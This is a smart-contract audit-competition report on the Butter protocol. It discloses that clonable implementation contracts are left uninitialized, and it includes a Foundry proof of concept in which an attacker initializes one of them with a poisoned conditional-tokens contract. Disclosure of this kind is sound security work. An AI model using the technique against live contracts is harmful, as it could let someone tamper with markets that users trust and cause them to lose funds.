# #39487 \[SC-Insight] flatCfmImplementation and conditionalScalarMarketImplementation contracts can be

**Submitted on Jan 30th 2025 at 21:02:57 UTC by @onthesunnyside for** [**Audit Comp | Butter**](https://immunefi.com/audit-competition/audit-comp-butter)

* **Report ID:** #39487
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-butter-cfm-v1>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

There are two contracts created in the `FlatCFMFactory` constructor. `flatCfmImplementation` and `conditionalScalarMarketImplementation` are deployed as a clonable implementations, but these contracts are not initialized or marked as initialized/implementation contracts.

## Vulnerability Details

Anyone can call `initialize` function on the clonable implementations `flatCfmImplementation` and `conditionalScalarMarketImplementation`. It may lead to potential use of these contracts by other users and in case if an attacker provides malicious address of the `conditionalTokens`, users may lose their funds interacting with such implementations.

## Impact Details

Conditional markets are created in a permissionless manner, but there are still sufficient checks in the `createFlatCFM` and `createConditionalScalarMarket` functions. They use a pre-defined `conditionalTokens` address for interaction, which is not present for the deployed clonable implementations and an attacker may provide malicious initialization parameters. It may affect users, as such implementations would still be used by the protocol for cloning, so someone may assume that those implementations may be working as intended.

## References

Where these implementations are deployed and not initialized - <https://github.com/immunefi-team/audit-comp-butter-cfm-v1/blob/main/src/FlatCFMFactory.sol#L86-L87>

Accessible for anyone `initialize` function - <https://github.com/immunefi-team/audit-comp-butter-cfm-v1/blob/045ab0ec86fd9a3f7cd0b0cd4068d75c46d2e316/src/FlatCFM.sol#L37> and <https://github.com/immunefi-team/audit-comp-butter-cfm-v1/blob/045ab0ec86fd9a3f7cd0b0cd4068d75c46d2e316/src/ConditionalScalarMarket.sol#L49>

## Proof of Concept

## Proof of Concept

```
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.20;

import {Test, console, Vm} from "forge-std/src/Test.sol";
import "@openzeppelin-contracts/proxy/Clones.sol";
import "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import "@openzeppelin-contracts/token/ERC20/ERC20.sol";
import "@openzeppelin-contracts/utils/Strings.sol";

import "src/FlatCFMFactory.sol";
import "src/FlatCFM.sol";
import "src/ConditionalScalarMarket.sol";
import "src/FlatCFMRealityAdapter.sol";
import "src/FlatCFMOracleAdapter.sol";
import "src/libs/String31.sol";

import {DummyConditionalTokens} from "./dummy/ConditionalTokens.sol";
import {DummyWrapped1155Factory} from "./dummy/Wrapped1155Factory.sol";
import {DummyRealityETH} from "./dummy/RealityETH.sol";

contract TestERC20 is ERC20 {
    constructor() ERC20("Test Token", "TEST") {
        _mint(msg.sender, 1000000e18);
    }
}

contract PoisonedConditionalTokens is IConditionalTokens {
    mapping(address => mapping(uint256 => uint256)) private _balances;
    mapping(address => mapping(address => bool)) private _operatorApproval;
    mapping(bytes32 => uint256[]) public override payoutNumerators;
    mapping(bytes32 => uint256) public override payoutDenominator;

    function reportPayouts(bytes32 /* questionId */, uint256[] calldata /* payouts */) external pure {
        console.log("Interaction with a malicious function"); // Here attacker may perform any unwanted actions (e.g. transfers)
    }

    function supportsInterface(bytes4 interfaceID) external pure override returns (bool) {
        return interfaceID == type(IERC165).interfaceId || interfaceID == type(IERC1155).interfaceId
            || interfaceID == type(IConditionalTokens).interfaceId;
    }

    function balanceOf(address account, uint256 id) public view override returns (uint256) {
        return _balances[account][id];
    }

    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)
        external
        view
        override
        returns (uint256[] memory)
    {
        require(accounts.length == ids.length, "length mismatch");
        uint256[] memory result = new uint256[](accounts.length);
        for (uint256 i = 0; i < accounts.length; i++) {
            result[i] = _balances[accounts[i]][ids[i]];
        }
        return result;
    }

    function setApprovalForAll(address operator, bool approved) external override {
        _operatorApproval[msg.sender][operator] = approved;
    }

    function isApprovedForAll(address account, address operator) public view override returns (bool) {
        return _operatorApproval[account][operator];
    }

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data)
        external
        override
    {
        require(to != address(0), "zero address");
        require(from == msg.sender || _operatorApproval[from][msg.sender], "not authorized");
        require(_balances[from][id] >= amount, "insufficient");
        _balances[from][id] -= amount;
        _balances[to][id] += amount;
        data;
    }

    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) external override {
        require(to != address(0), "zero address");
        require(ids.length == amounts.length, "length mismatch");
        require(from == msg.sender || _operatorApproval[from][msg.sender], "not authorized");
        for (uint256 i = 0; i < ids.length; i++) {
            require(_balances[from][ids[i]] >= amounts[i], "insufficient");
            _balances[from][ids[i]] -= amounts[i];
            _balances[to][ids[i]] += amounts[i];
        }
        data;
    }

    mapping(bytes32 => address) public _test_prepareCondition_oracle;

    function prepareCondition(address oracle, bytes32 questionId, uint256 outcomeSlotCount) external override {
        require(outcomeSlotCount <= 256, "too many outcome slots");
        require(outcomeSlotCount > 1, "there should be more than one outcome slot");
        bytes32 conditionId = keccak256(abi.encodePacked(oracle, questionId, outcomeSlotCount));
        require(payoutNumerators[conditionId].length == 0, "condition already prepared");
        payoutNumerators[conditionId] = new uint256[](outcomeSlotCount);
        _test_prepareCondition_oracle[questionId] = oracle;
    }

    mapping(bytes32 => address) public _test_reportPayouts_caller;

    function splitPosition(IERC20, bytes32, bytes32, uint256[] calldata, uint256) external override {}
    function mergePositions(IERC20, bytes32, bytes32, uint256[] calldata, uint256) external override {}
    function redeemPositions(IERC20, bytes32, bytes32, uint256[] calldata) external override {}

    function getConditionId(address oracle, bytes32 questionId, uint256 outcomeSlotCount)
        external
        pure
        override
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(oracle, questionId, outcomeSlotCount));
    }

    function getCollectionId(bytes32, bytes32, uint256) external pure override returns (bytes32) {
        return keccak256("colId");
    }

    function getPositionId(IERC20, bytes32) external pure override returns (uint256) {
        return uint256(keccak256("posId"));
    }

    function getOutcomeSlotCount(bytes32 conditionId) external view returns (uint256) {
        return payoutNumerators[conditionId].length;
    }

    function _mint(address to, uint256 id, uint256 amount) internal {
        _balances[to][id] += amount;
    }

    function _burn(address from, uint256 id, uint256 amount) internal {
        require(_balances[from][id] >= amount, "burn exceeds balance");
        _balances[from][id] -= amount;
    }
}

contract Base is Test {
    FlatCFMFactory public factory;
    // This could be a dummy.
    FlatCFMRealityAdapter public oracleAdapter;
    DummyConditionalTokens public conditionalTokens;
    DummyRealityETH public reality;
    IWrapped1155Factory public wrapped1155Factory;
    IERC20 public collateralToken;

    uint32 constant QUESTION_TIMEOUT = 1000;
    uint256 constant MIN_BOND = 1000000000000;

    function setUp() public virtual {
        conditionalTokens = new DummyConditionalTokens();
        reality = new DummyRealityETH();
        wrapped1155Factory = new DummyWrapped1155Factory();
        oracleAdapter =
            new FlatCFMRealityAdapter(IRealityETH(address(reality)), address(0x00), QUESTION_TIMEOUT, MIN_BOND);
        collateralToken = new TestERC20();

        factory = new FlatCFMFactory(
            IConditionalTokens(address(conditionalTokens)), IWrapped1155Factory(address(wrapped1155Factory))
        );

        vm.label(address(factory), "factory");
        vm.label(address(oracleAdapter), "reality adapter");
        vm.label(address(conditionalTokens), "CT");
        vm.label(address(reality), "reality");
        vm.label(address(wrapped1155Factory), "wrapped 1155 factory");
        vm.label(address(collateralToken), "$COL");
    }
}

contract ConstructorTest is Base {
    function testUninitializedImplementations() public {
        FlatCFM cfmImpl = FlatCFM(address(factory.flatCfmImplementation()));
        ConditionalScalarMarket csmImpl = ConditionalScalarMarket(address(factory.conditionalScalarMarketImplementation()));

        assertEq(
            cfmImpl.initialized(),
            false
        );

        assertEq(
            csmImpl.initialized(),
            false
        );

        vm.startPrank(address(1337));

        PoisonedConditionalTokens pct = new PoisonedConditionalTokens();

        cfmImpl.initialize(oracleAdapter, pct, 2, 0x0, "");
        cfmImpl.resolve();
    }
}
```
